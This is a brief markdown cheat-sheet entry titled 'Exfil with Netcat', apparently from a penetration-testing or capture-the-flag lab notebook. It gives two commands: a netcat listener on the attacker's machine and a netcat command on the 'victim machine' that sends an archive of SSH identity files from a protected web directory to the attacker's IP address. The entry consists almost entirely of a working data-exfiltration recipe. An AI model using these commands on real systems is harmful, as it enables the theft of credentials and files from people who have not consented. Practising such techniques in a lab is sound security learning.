
# Exfil with Netcat
- on local machine, start nc listener and send to file (in this example, I was exfil'ing a compressed file) `nc -lvp 1234 > backup.tgz`
- on victim machine, run nc to send the data `nc 10.10.14.20 1234 < /home/david/public_www/protected-file-area/backup-sshidentity-files.tgz`